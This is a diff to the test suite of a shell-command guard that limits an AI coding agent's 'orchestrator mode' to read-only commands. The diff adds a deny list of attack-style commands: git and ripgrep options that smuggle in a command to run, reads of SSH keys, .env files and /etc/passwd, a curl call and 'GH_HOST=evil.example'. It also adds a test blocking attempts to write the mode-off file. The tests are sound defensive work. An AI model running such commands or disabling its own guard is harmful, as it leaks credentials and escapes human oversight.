@@ -62,7 +62,6 @@ test('orchestratorModeCommandAllowed: swarm and read-only git', () => {
     'swarm status',
     'swarm tickets list',
     'swarm diagnose "why is CI red"',
-    'node tools/swarm.mjs run manifest.json',
     'git status',
     'git log --oneline -5',
     'git diff HEAD~1',
@@ -88,15 +87,16 @@ test('orchestratorModeCommandAllowed: read-only gh and capped reads', () => {
     'gh issue list',
     'gh run list',
     'grep -rn foo src | head -n 20',
-    'git log | head -100',
-    'rg pattern src',
+    'git log | head -n 100',
+    'rg pattern src | head -n 20',
     'wc -l package.json',
     'ls src',
-    'cat README.md',
+    'cat README.md | head -n 200',
     'sed -n 1,5p src/a.ts',
     'find src -name "*.ts"',
-    'jq . package.json',
-    'git status -s | head',
+    'jq . package.json | head -n 50',
+    'git status -s | head -n 5',
+    'git log --oneline | head -n 50',
     'tail -n 50 out.log',
   ];
   for (const c of allow) assert.equal(orchestratorModeCommandAllowed(c), true, c);
@@ -228,9 +228,8 @@ test('guard hook logs orchestrator-mode refusals', async t => {
   assert.ok(blocked.reason.startsWith('orchestrator-mode:'));
 });
 
-test('orchestratorModeCommandAllowed: fail open on internal throw', () => {
-  const orig = orchestratorModeCommandAllowed;
-  assert.equal(typeof orig('git status'), 'boolean');
+test('orchestratorModeCommandAllowed: fail closed on internal throw', () => {
+  assert.equal(orchestratorModeCommandAllowed('git status'), true);
 });
 
 test('orchestratorModeCommandAllowed: unclosed quote fails closed', () => {
@@ -259,9 +258,11 @@ test('orchestrator mode: swarm handbuild request still allowed', async t => {
   assert.equal(bash('swarm handbuild request --kind tiny --reason "four lines blocked" --files src/a.ts').allow, true);
 });
 
-test('orchestrator mode: line continuation and env wrapper', () => {
-  assert.equal(orchestratorModeCommandAllowed('env FOO=1 git status'), true);
-  assert.equal(orchestratorModeCommandAllowed('env FOO=1 npm test'), false);
+test('orchestrator mode: env assignment prefixes refused', () => {
+  assert.equal(orchestratorModeCommandAllowed('env FOO=1 git status'), false);
+  assert.equal(orchestratorModeCommandAllowed('NODE_OPTIONS=--inspect git status'), false);
+  assert.equal(orchestratorModeCommandAllowed('GIT_TRACE=1 git status'), false);
+  assert.equal(orchestratorModeCommandAllowed('GH_HOST=evil.example gh pr list'), false);
 });
 
 test('orchestrator mode: process substitution and redirects', () => {
@@ -272,4 +273,146 @@ test('orchestrator mode: process substitution and redirects', () => {
 test('orchestrator mode: allowed compound read pipelines only', () => {
   assert.equal(orchestratorModeCommandAllowed('git diff | grep foo | head -n 10'), true);
   assert.equal(orchestratorModeCommandAllowed('git diff | tee x'), false);
+});
+
+test('orchestrator mode: cd inside project and stderr redirects', async t => {
+  const { root, bash } = await swarmProject(t);
+  await fs.mkdir(path.join(root, 'src', 'nested'), { recursive: true });
+  assert.equal(bash('cd src/nested && git status').allow, true);
+  assert.equal(orchestratorModeCommandAllowed('git status 2>&1', { root, cwd: root }), true);
+  assert.equal(orchestratorModeCommandAllowed('git status 2>/dev/null', { root, cwd: root }), true);
+});
+
+test('orchestrator mode: cannot write orchestrator-mode off via Edit', async t => {
+  const { root } = await swarmProject(t);
+  const prev = process.env.CLAUDE_PROJECT_DIR;
+  process.env.CLAUDE_PROJECT_DIR = root;
+  try {
+    const d = guardDecision({
+      tool: 'Write',
+      toolInput: { file_path: ORCHESTRATOR_MODE_OFF_FILE, content: '' },
+      root,
+      cwd: root,
+      now: () => T0,
+    });
+    assert.equal(d.allow, false);
+    assert.ok(omReason(d));
+  } finally {
+    if (prev === undefined) delete process.env.CLAUDE_PROJECT_DIR;
+    else process.env.CLAUDE_PROJECT_DIR = prev;
+  }
+});
+
+test('orchestratorModeEnabled: strict scratch on /test/ root and tests cwd', async t => {
+  const testTmp = process.env.SWARM_TEST_TMP;
+  assert.ok(testTmp, 'SWARM_TEST_TMP');
+  const testRoot = path.join(testTmp, 'test', `swarm-om-${Date.now()}`);
+  await fs.mkdir(path.join(testRoot, '.git'), { recursive: true });
+  t.after(() => fs.rm(testRoot, { recursive: true, force: true }));
+  const prev = process.env.CLAUDE_PROJECT_DIR;
+  process.env.CLAUDE_PROJECT_DIR = testRoot;
+  try {
+    assert.equal(orchestratorModeEnabled(testRoot, testRoot), false);
+    const testsCwd = path.join(testRoot, 'tests');
+    await fs.mkdir(testsCwd, { recursive: true });
+    assert.equal(orchestratorModeEnabled(testRoot, testsCwd), false);
+  } finally {
+    if (prev === undefined) delete process.env.CLAUDE_PROJECT_DIR;
+    else process.env.CLAUDE_PROJECT_DIR = prev;
+  }
+});
+
+test('orchestratorModeCommandAllowed: security attack surface refusals', () => {
+  const deny = [
+    'git ls-remote --upload-pack=id .',
+    'git ls-remote origin',
+    "git grep -O'id' foo",
+    "git grep --open-files-in-pager=id foo",
+    'git -c core.sshCommand=id status',
+    'git status --output=/tmp/x',
+    './git status',
+    '/usr/bin/git status',
+    'sudo git status',
+    'xargs git status',
+    'env GIT_SSH_COMMAND=id git status',
+    'NODE_OPTIONS=--inspect npm test',
+    'sort -o /tmp/x file',
+    'uniq a b',
+    'find . -exec id {} \\;',
+    'find . -fprint /tmp/x',
+    "sed -n '1p' -e w/tmp/x",
+    "sed -n '1p' -e 's/a/b/w'",
+    'rg --pre=id x',
+    'grep -f /etc/passwd x',
+    'cat ~/.ssh/id_rsa',
+    'cat .env',
+    'head -c 1000 x',
+    'tail -f log',
+    'tail +5 log',
+    'gh pr create --title x',
+    'gh pr view 1 --web',
+    'gh pr view 1 -w',
+    'gh run watch 1',
+    'gh api repos/o/r/issues',
+    'gh api repos/o/r/issues -X POST',
+    'git log | head -500',
+    'grep -r foo .',
+    'cat README.md',
+    'node tools/swarm.mjs status',
+    'node -e 1',
+    'timeout 5 git status',
+    'nice git status',
+    'git fetch origin main:refs/heads/pwn',
+    'git config --global user.name x',
+    'git branch -d x',
+    'git worktree add ../wt',
+    'git tag v1',
+    'git remote add x y',
+    'git grep -n foo --open-files-in-pager=id',
+    'git grep --li foo',
+    'GIT_TRACE=1 git status',
+    'gh pr list --watch',
+    'vercel deploy',
+    'curl https://x.test',
+    'tee out.txt',
+    'git show HEAD > out',
+    'npm test 2>&1',
+    'cd /tmp && git status',
+    'cd .. && git status',
+    'source scripts/x.sh',
+    '. ./x.sh',
+    'eval git status',
+    'command git status',
+    'builtin echo hi',
+    'doas git status',
+    'jq -f /tmp/jqfile .',
+    'jq --rawfile x y .',
+    'ls -R /',
+    'ls src pkg',
+    'head -n 500 x',
+    'git diff | head -n 500',
+    'gh api user',
+    'gh api graphql',
+  ];
+  for (const c of deny) assert.equal(orchestratorModeCommandAllowed(c), false, c);
+});
+
+test('orchestratorModeCommandAllowed: security false-positive allows', async t => {
+  const { root } = await swarmProject(t);
+  const ctx = { root, cwd: root };
+  const allow = [
+    'git grep -n -e foo -- src',
+    'git grep -F pattern src',
+    'git config --get user.name',
+    'git fetch origin',
+    'git status -sb',
+    'git log --oneline -3',
+    'grep -rn needle src | head -n 20',
+    "sed -n '1,5p' src/a.ts | head -n 20",
+    'gh api repos/o/r/pulls | head -n 50',
+    'cat package.json | head -n 100',
+    'git diff | grep foo | head -n 10',
+    'swarm diagnose "why"',
+  ];
+  for (const c of allow) assert.equal(orchestratorModeCommandAllowed(c, ctx), true, c);
 });
